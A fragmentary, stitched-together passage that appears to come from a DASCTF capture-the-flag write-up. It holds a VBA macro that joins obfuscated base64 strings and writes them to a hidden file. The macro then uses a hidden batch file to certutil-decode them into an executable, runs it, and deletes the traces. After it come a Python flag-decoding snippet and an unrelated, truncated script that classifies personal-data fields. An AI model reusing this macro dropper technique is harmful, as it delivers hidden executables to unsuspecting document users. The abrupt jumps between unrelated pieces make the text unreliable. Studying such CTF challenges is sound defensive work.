 ckfognONvFXDXhZSJWVEDVbUxGUTNFmbwt = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFNQ01CUUFFQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 FsVvYVmrXEYYcmoAUxnlpnyCb = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBVWxORVUrU3BO"
 cOvZPoCKLQokEcYfJSSsIsQCvzVMGChhzDaIHjQYMYNUWiMfkOtYyWCouuOwSS = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 jmRkplIbQIijaupiW = "RUFFTWdCQU1BbUFRRDJKZ0VBNk1nQkFCQW5BUUJVSndFQThNZ0JBSEFuQVFEUEp3RUFWTWdCQU04bkFRQ29LQUVBY01nQkFLZ29BUURGS0FFQWlNZ0JBSkFwQVFCZktnRUFOTWdCQUtBcUFRRE5LZ0VBSU1rQkFNMHFBUUE0S3dFQU5Na0JBRGdyQVFCU0t3RUFXTWtCQUtBckFRQUFMZ0VBK01nQkFLQXVBUUMvTGdFQXZNZ0JBTkF1QVFDVkx3RUFHTWdCQU5BdkFRQTBNQUVBbk1nQkFGQXdBUUIxTUFFQXRNZ0JBRUF4QVFCMU1RRUFuTWtCQUpBeEFRQmlNZ0VBaE1rQkFLQXlBUUN6TWdFQWZNa0JBTUF5QVFCY013RUFiTWtCQUpBekFRQ2ZOQUVBZE1rQkFQQTBBUUNCTlFFQWpNa0JBTEExQVFCaU5nRUFsTWtCQUpBMkFRQldOd0VBV01vQkFKQTNBUUFhT0FFQVVNb0JBRkE0QVFDeU9BRUE2TWtCQU5BNEFRRDlPQUVBS01vQkFCQTVBUUF0T1FFQUlNb0JBRUE1QVFCd09RRUFRTW9CQUlBNUFRQ1ZPUUVBU01vQkFLQTVBUUFGT2dFQUdNb0JBQ0E2QVFCT09nRUFNTW9CQUdBNkFRQjFPZ0VBT01vQkFJQTZBUURKT2dFQStNa0JBT0E2QVFEa093RUFDTW9CQURBOEFRQzdQQUVBdk1rQkFPQThBUUFQUFFFQThNa0JBQ0E5QVFCZlBRRUFBTW9CQUhBOUFRRHRQUUVBck1rQkFCQStBUUJiUGdFQXRNa0JBSEErQVFDalBnRUFwTWtCQUxBK0FRQnVQd0VBYU1vQkFLQS9BUUFVUUFFQVlNb0JBS0JBQVFDMlFBRUFj"
 kgsfHhlRVLtlJJqRMcOzUYrMSiEfKEemLrQjzANYdCoNIZSGRXoLHUPJDbxWaBhWjF = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16RWlKVENRSVNJUHNlRWlMakNTQUFBQUEveFZoMmdBQVNJdUVKSUFBQUFCSWk0RDRBQUFBU0lsRUpGREhSQ1JBQUFBQUFPc0tpMFFrUVAvQWlVUWtRSU44SkVBQ2ZXZEZNOEJJalZRa1dFaUxUQ1JRL3hVbjJnQUFTSWxFSkVoSWczd2tTQUIwUTBqSFJDUTRBQUFBQUVpTlJDUmdTSWxFSkRCSWpVUWthRWlKUkNRb1NJdUVKSUFBQUFCSWlVUWtJRXlMVENSSVRJdEVKRkJJaTFRa1dEUEoveFhoMlFBQTZ3THJBdXVJU0lQRWVNUE16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1TSWxVSkJCSWlVd2tDRWlEN0RoSWkwUWtRRWlKUkNRUVNJdEVKQkJJWTBBOFNJdE1KQkJJQThoSWk4RklpVVFrSUVpTFJDUWdTSWxFSkFoSWkwUWtDQSszUUJSSWkwd2tDRWlOUkFFWVNJbEVKQmhJaTBRa0NBKzNRQVpJYThBb1NJdE1KQmhJQThoSWk4RklpVVFrS0VpTFJDUVlTSWtFSk9zTVNJc0VKRWlEd0NoSWlRUWtTSXRFSkNoSU9RUWtkQzFJaXdRa2kwQU1TRGxFSkVoeUhVaUxCQ1NMUUF4SWl3d2tBMEVJaThCSU9VUWtTSE1HU0lzRUpPc0U2N3d6d0VpRHhEakR6TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 xkFzR = "ckEvLzlJaTloSWhjQjFIdjhWS3NFQUFJUDRWM1VUTTlKRWpVTUlTSTFNSkZEb3A4RC8vMGlMMkVpTHcrbG8vdi8vek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16RWlKWENRZ1YwaUI3SEFHQUFCSWl3WFVmd0FBU0RQRVNJbUVKR0FHQUFCSXgwUWtRQUFCQUFCSWpVUWtZRWlKUkNRNFRJMk1KR0FFQUFCSWpZUWtZQUlBQUVqSFJDUXdBQUVBQUVtTCtFaUpSQ1FvU0l2YVNNZEVKQ0FBQVFBQVFiZ0RBQUFBU0kxVUpGRG81c0wvLzRYQWRXMU1qUVYyWmdBQWpWQUpTSTJNSkdBQ0FBRG95TUQvLzRYQWRWSk1qUVZMWmdBQWpWQUVTSTFNSkdEb3NNRC8vNFhBZFRwSWpVUWtZRWlMMTBpSlJDUW9USTJNSkdBRUFBQklqWVFrWUFJQUFFaUx5MHlOUkNSUVNJbEVKQ0RvZWIvLy96UEpoY0FQbE1HTHdlc0NNOEJJaTR3a1lBWUFBRWd6ek9pWHdQLy9TSXVjSkpnR0FBQklnY1J3QmdBQVg4UE16TXpNek16TXpNek16TXpNek16TXpNek16"
 bdKCMyWHmOWcAgjlbMVbEglVvFJcGubBgwEzhrLw = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 alecfpzZXAAjOchHsifndkresMxMRmsghnoWrIPjqkOCxIruLdRoapuzDjdMZkMaJFAIuj = "ek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16"
 HKEqnxGiPFRjdCeRljCZffFFTKkCvRMfFgqG = "TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek1RRlZJZyt3Z1NJdnFTSWxOUUVpTFJVQklpd0NMQUlsRkpFaUxSVUNMVFNSSWk5RG9ONUwvLzVCSWc4UWdYY1BNek16TXpNek16TXpNek16TXpNek16RUJWU0lQc0lFaUw2a2lMQVRQSmdUaUlFMjFBRDVUQmk4RklnOFFnWGNQTXpNek16TXpNek16TXpNek16TXpNekVCVlNJUHNJRWlMNmtpSlRVaElpMFZJU0lzQWl3Q0pSU1NMUlNROUJRQUF3SFVKeDBVZ0FRQUFBT3NIeDBVZ0FBQUFBSXRGSUVpRHhDQmR3OHpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpNek16TXpN"
 BumFQkMgMUNykMNviBlfdZHOyVThmijmcNTUNaXSNHYdNzXKRqhYiKlaRzCfBlcoN = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB"
 dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU = VEYGvieIXwNQYBkFyYgJLRPRfUMBOcvwKNCsAFLihTKZJAAEf + RseODqsHZOcDsHSeQJsCp + vZPlUyTjdULcGVTHUmzRSXXszQRFjEUoLeWjZVFPOiGNyOFRpRJIvSjDGmk + EtChjxuOXhmrIvqKWXIxaPTAo + pheHdhgetPucMsVcfiHrhrcpKwuklhIYmvBQvkydUigvKCAfHsihqnpAmpTZhDTZR + pmyRvIoaiAdTnm + PybvPlDJqWjrprGZSOHELncQwLXqEXvfMGEBVOEaccKNdCxzkRXJDNdsM + UukH + cSdyVPVfGzkDXafOVvTFIWCFkfroRguXbaooHEMLvryMLhSqHl + CxNzoOzrcwNLxwYcHMjlpynrYs + LYYYgtKeNO + QUukdsuDLJmKubdyASnDeGkASEJCcErPLDLhGtHDhngKqmI + tmhPQej + FOwoRiFKKMMDhtxiUfJDWzaqNJrPZwASlDxnERT + qpRHjZoTBzGJBQeVBJBEvDvfxiPXTkBzbYzFCng + WKMrozPvTpOFCSNgWtqwjGpRhnutJbgPjzC + czyBdpTqXRwcJVOUWkrggOGUymhuCzDOujPPMDouEPSuUgJxYKOviAjHVP + LUAoboTgsNfGwzgqMmwAGNgNPEHQiyGMldsAGKiidxDSFGAXcwjrYrbnpzEIlOcnGHPSv + LJhyrLoIncLkdHEcvUAqOHrqWcaMMbrRwOoXsjwuIRmckImjwlqUKadNKtyoWTLMabOqb + eYGXDYAkiMnkMYrxGeLZkudKRTmVWqyiygBJrkzvMDupSVfqXYyuTLwLHOkjhvC
 AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog = GuQxrSYxJGddVXCHQpGAWAkiZgqPUKwPHBncITqQUblgcwlHmQqactoHwqrduW + kgsfHhlRVLtlJJqRMcOzUYrMSiEfKEemLrQjzANYdCoNIZSGRXoLHUPJDbxWaBhWjF + xdBS + tLnjIIqQbfzUXdfNouipqHjXpLG + XKfg + FWMyIMgY + CRhXDbBjmGHbyTLCeuwFsAwYKdc + zIlByGQtxrTAJVlTCjNloPoxQZyhA + xPwYBnIxnYgEBltvciefwyPdNaqcxqVUFITQXdSjFmRRnEAHVk + KuoAmNWXhbIXyUUDtQJrlEs + fNRbSvFMgVUyiPQKVtUtSCvCrotHNgIDP + znGAYdzaLHTCbsrUAAiOWfIWelxJaiawlEYPZH + AgueKiModrZKnzNcDlSlciLGxibrcCzQwfyoKRKeKsrjDfBcZejuWjlgDcWTgkzJa + MCJnXUJSpRRJmCHBNyGgL + xkFzR + DxGfjRpmNTaNGoJXjmOatrlacvaUAOIngqVHZVdHiYsqXtJVjfUeKbFDcCgeOYeJUCcb + dDrAROqgDwONUkPBEbrtUpacneyMSHVCckaqZmBk + ukSyHuWLSaVUrwVfEfCREVehGPjvISzxLOwkzbNqIAmVy + ckZbelCalPLDXKtBcWmESQNZktlvc + OGqredxqtvJndLDggszIxTZoq
 BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo = TXIzOYq + LyzbXnuteIvewfsTHJjlzQReyFxqXpcXpGhxmgHTXkuTdCSgxC + mjhLporjewBwRYCGtfVqGnokgrsjpeMt + MCoojZsVTSQqYyKcalviqCyoDLlFCBhKufeKnCekvEasIuvaFioqLecZdrmWUnnRrLtU + cOvZPoCKLQokEcYfJSSsIsQCvzVMGChhzDaIHjQYMYNUWiMfkOtYyWCouuOwSS + obbOsgvhpNXIcdbYdkGYIaNBBcElKifCqpgxJTckSeauwtfbPgNfLQBUR + reeSpEYsBkdNAwSDqsiDTLBBHdHuaMOZuoTHJEzyHFkIp + sPqnjMUPkXraNiYdmKDHaFHQOCaeGjVuwtTlZkwbEWSWsMqfoiCRhNjPSefNoKgCczlU + XgBQyggOVzqWSVBIMaefHTOEuQxOQwtSFrvMUrNTrUEmiUZJUAtcTscKrDnJrBZyw + oOSfGOgqlGkIAORYvObGcsjZrFGieEKfgdpWSbhHAxbUytAITWPR + QCvxYrufwAwJmOgajhdubCnaXlXrdAifKoAZVqfIMhXUSnFsJEpGx + iXJYTzXYeRAxxAdcdWEMcLSgPDiYSsfZ + BHGCUEAlNjHwSYAoKMdtxBsHfu + haZjvFCfAaX + yPeffAvpRkwnFgAvycVKfbTZwpVyPepiOGTNCcceUpvsiQCbKCeQmFYmr + wSmoLUZYFsZlCEgyqFEUQperFTvljoBPZzetdZXCawKnEaJnXzmqo + ywxosoczblRtUvLuDXsaqcuOFPontRjdwaJORUTYjIHHsPWSrBE + CMcHjPZdSArLleKhnlmUMet + cEHQlEzbinraPdDZxiXfvwhswqBcsFPVVJnCcMMMaKf + HKEqnxGiPFRjdCeRljCZffFFTKkCvRMfFgqG
 yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA = cPrUiVywLZUKwzBPpPGaKMdqfRcymaJgxAoGgEYriOdrgt + WeHDIoVkYMAsJRIxIXO + alecfpzZXAAjOchHsifndkresMxMRmsghnoWrIPjqkOCxIruLdRoapuzDjdMZkMaJFAIuj + BgcwqEuOjbRLfvYOkIeO + gNQUkayMQCoqhaCxkMsR + PIkxRHBZXbWiGvPkUBnCkhaGEtGOaTVcZkOejmvrTsocw + bdKCMyWHmOWcAgjlbMVbEglVvFJcGubBgwEzhrLw + nakYwagVroMrOEfsteXllfcoBvAuNAdrwdDlgazyqsgPKtEegoCIwCUjGupYfo + gyLPgEnLTxnbxyZNvFPsslE + fqbGMOBQtLlIfRylAswLJzJIwewRSFLOCJBsqNXcSjiABtKPFWgGJgnkVLQSEDniZulS + ckfognONvFXDXhZSJWVEDVbUxGUTNFmbwt + EwWonYDzDhRymjiquMYqocSEJJnZeavOftPzjZfaMZlSaPmImpvcCmzJZjsywTyHKU + BumFQkMgMUNykMNviBlfdZHOyVThmijmcNTUNaXSNHYdNzXKRqhYiKlaRzCfBlcoN + vJefuibNYpIBJouGCweDJOwOvK + kiwEfSwbhkXperQLoELoyBXdrSpxHTAXgsYTrLTUuiZPImsimfJRFNPSwgkmKnZNVrXq + rGDzbNeSOAQBdDQMhR + jGEvPHTyQBgJGqDSXfaWZVOnnAKsLSeSzLTydie + jlpDVEFMxbmONUlkfhGVHkOoOeMLXzAiLonunWnRvNQVlCIwuxiKrkHC + xeXzhlxSWXXvlttZcMXmr + BnBfMYeYWEZEQqZZgBiphAzpawtwRnSUfnIatVlrrPKgoagdMIs
 pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU = VBKpNPcerfjsMDbNePJypSVjCZ + YABsnhnhxXaUhoDPUSvvFRbIsOHAc + FsVvYVmrXEYYcmoAUxnlpnyCb + FBhMCgIdLoYhtHCKPaUjzTXWQrlTWFjaOvvCOrpvPMV + wYrrjLfnbUwYi + CmIiDOtlbfTzeZwoJcMPoXEambQWUqgMmWTIgJdnQazyI + YGBHxOaXgIoKdqWzNQGNHtqUEMzos + WzzRmZEXyBwTMR + oOrwvvNKQtFkUDWgRQhpLEADLhCWJvZqBTozLaRsgikdVKGHTEGzXBpY + HMoOPkeugJdMLpGdjluwNnPIJwghxQyhDoAnlaBJgjLxBMyaowUuCgCLsTuoPjRcJkk + gSTHkqRczwLplVanyWeaUyULjTzKvwEPRiOvqnhzYyCjb + BsDNqzhXCtPbEzVKpyDrbfU + emqkzLZGDkbnWPfWmoTmYGLMiZaEqwpWTekMIGY + AICsXopyxjKVOYHULreIvTjeZLWJSnHXVjXvGUXXHLubqYrPXyEhrHZsdtCGeYhs + oyVUxfArLNULzUIgjttUncrGNmKbJostRXGxgsrpsYA + gkPIowzPeMzZhIlu + yLMpvyTCnJZPDgwQBPHkXbuEMkmQiFzmxyCqwxKuVeIqBQZscaBLQRHRcOXO + lJdgGUR + gAeijdYgfomMRoOeMejpaoIYRXooMsJRSX + SAJdC
 pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG = KJApECBsBygCpaCPqkHESDxewQKrYbmg + kUozySeFfiJiWBdZvCFFrrdxoTSfXmBjPevyUb + OqJcLRxQpnYs + tTcokkYimbNUQxVmaFGdwTJuSZjxeiJMAFbGsSCr + jCDGmeITNx + USrSXWldjOmExiDNcxtNWUyMThsastYxrYoKTFEWOuJcvfDjgnfIcEa + jmRkplIbQIijaupiW + dPHPpts + KmMyLqjCSWrwNkvMlzkbnHsgwwqlHKsuoDdMRWhvofvhmkeBSrORbXcwXqgjIYnoYoIGIb + RSEcHbLzGYqWPqwV + hSMCKWvRKxqOlNXtxEvAkoMfYsBVBUnGfsjyGVjupZBKJg + UKykwpHdNNGkXiqaxyiBGUNAaUweTdOoBKGRmqRRIiPYTSSdiJISJkCfZAtDnbQmbxxLv + HTLdEBDxvDgWgMPvvDcMsvqvLYa + UXsYABfpUwdH + hnDgZgRNZjLm + JuXQYROQBBeUStRcoCeCphWvZNIpiJ + LApgwYbUQYSyklAgNUxVRcVucekjfKxsELGOuvnmbPlAjrKUuKspsufADOwt + TpxkVXqMUpsPDfXyHhBcXTCkqGNpjIL + izdNRwcJTeFo + vFLyllXrhmSiCmOAKRsNkTcKp
 QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag = NXKmCFlWcjX + TZHYOwXfxjTPvguvOFnAT + SvHaIFYrqYWuSmKFOoPXtUOnfQUrNUfyjodbbRYy + oBluSsHkDCzAto + dFiJWKhjbPrexvpfDvVJqNYxBHlMbzLjichbXJYNZBfMaBiFBHcaUKjXRLowLQmTNse + RzAiANtvbRZPXTAsgSwrtKTXDAxZvqMSiUWIDXSXTmocZPagjTaMNLa
 xpkdb = dWPtWzWvKrZRFrsAWZMGNjZQbCrgAImKXVUkOykXWeRltpUU + AMaKeZzlhAtdNANKAKwMNbKEKUWuQVZQbbCJIUog + BvEKpalonhsRIgbPkYPYbsbQGzIzvPitapncgtGKIo + yBILPYnXCUApVHExOtpKlnfTkVfexwgrFQOFIveA + pqdgalQAZJKIDySPundFqdITahrgAYveJXfZCOUHWnUDKXZwZU + pErQJcjFIvYQeIehtTPMaOgEwFvvjnaTkabtJDvpHbWG + QmLHKhwBebnYaryyPsFeBassnVEjIoURcqNseXyjyMdcDfFnag

 tempPath = ThisDocument.Path & "temp1"
 Set tempfile = fso.CreateTextFile(tempPath, True)
 fso.GetFile(tempPath).Attributes = 2
 tempfile.WriteLine xpkdb
 tempfile.Close

 batPath = ThisDocument.Path & "temp.bat"
 Set batFile = fso.CreateTextFile(batPath, True)
 fso.GetFile(batPath).Attributes = 2
 batFile.WriteLine "@echo off"
 batFile.WriteLine "cd /d " & ThisDocument.Path
 batFile.WriteLine "certutil -decode temp1 temp|certutil -decode temp temp.exe"
 batFile.WriteLine "del temp"
 batFile.WriteLine "temp.exe " & """" & Result & """"
 batFile.WriteLine "del temp.exe"
 batFile.Close
 Set objExec = objShell.Exec(batPath)
 Set objStdOut = objExec.StdOut
 Do While Not objStdOut.AtEndOfStream
 output = Trim(objStdOut.ReadLine)
 Loop
 output = Left(output, Len(output))
 StartTime = Timer
 Do While Timer < StartTime + 1
 DoEvents
 Loop
 fso.DeleteFile batPath
 fso.DeleteFile tempPath

 If output = "good" Then
 temp = MsgBox("good!!!", , "congratulations!!!")
 Exit Do
 Else
 temp = MsgBox("Sorry, U are wrong!!!", , "Hacked_by_??????")
 isContinue = MsgBox("Continue?", vbYesNo + vbQuestion, "Warning")
 End If
 Loop While isContinue = 6
End Sub
import itertools

v9 = [
        4288, 4480, 5376, 4352, 5312, 4160, 7936, 5184, 6464, 6528, 5632, 3456,
        7424, 5632, 6336, 6528, 6720, 6144, 6272, 7488, 6656, 7296, 7424, 2432,
        2432, 2432, 5632, 4416, 3456, 7168, 6528, 7488, 6272, 5632, 3520, 6208,
        5632, 4736, 6528, 6400, 7488, 3520, 5632, 5184, 3456, 7488, 7296, 3200,
        6272, 7424, 2432, 2432, 2432, 7808
    ]
v10 = [0] * 54

def find_valid_a2():
    temp = ''
    for num in range(54):
        print(chr((v9[num] >> 6)), end="")

find_valid_a2()

# CFTDSA|QefX6tXcfi`buhrt&&&XE6pfubX7aXJfdu7XQ6ur2bt&&&z
DASCTF{Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!}
import csv
import re

# 定义字段顺序
field_order = ['编号', '用户名', '密码', '姓名', '性别', '出生日期', '身份证号', '手机号码']
number = [str(i) for i in range(1, 10001)]

# 类型判断函数
def identify_field(value):
    if re.fullmatch(r'd{11}', value):
        return '手机号码'
    elif re.fullmatch(r'd{17}[dX]', value):
        return '身份证号'
    elif re.fullmatch(r'd{8}', value):
        return '出生日期'
    elif value in ['男', '女']:
        return '性别'
    elif re.fullmatch(r'([a-fA-Fd]{32})', value):
        return '密码'
    elif re.fullmatch(r'[u4e00-u9fff]+', value):
        return '姓名'
    elif value in number:
        return '编号'
    # elif re.fullmatch(r'[a-zA-Z0-9]+', value):
    #     return '用户名'
    else:
        # print(value)
        return '用户名'

# 将数据按识别类型排序的函数
def reorder_row_by_type(row):
    field_map = {}
    for value in row:
